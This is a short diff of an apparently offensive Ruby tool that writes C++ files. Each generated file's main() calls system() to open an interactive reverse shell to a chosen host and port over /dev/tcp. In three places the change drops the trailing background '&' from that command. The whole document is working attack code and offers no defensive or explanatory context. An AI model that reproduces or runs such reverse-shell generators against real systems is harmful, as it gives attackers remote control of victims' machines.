@@ -66,7 +66,7 @@ if File.directory? file
                 f.puts "#include <iostream>"
                 f.puts "using namespace std;"
                 f.puts "int main() {"
-                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
                 f.puts "}"
             }
             puts "#{s}Saved to #{file}!"
@@ -81,7 +81,7 @@ if File.directory? file
                 f.puts "#include <iostream>"
                 f.puts "using namespace std;"
                 f.puts "int main() {"
-                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
                 f.puts "}"
             }
             puts "#{s}Saved to #{file}!"
@@ -110,7 +110,7 @@ else
                 f.puts "#include <iostream>"
                 f.puts "using namespace std;"
                 f.puts "int main() {"
-                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
                 f.puts "}"
             }
             puts "#{s}Saved to #{file}!"
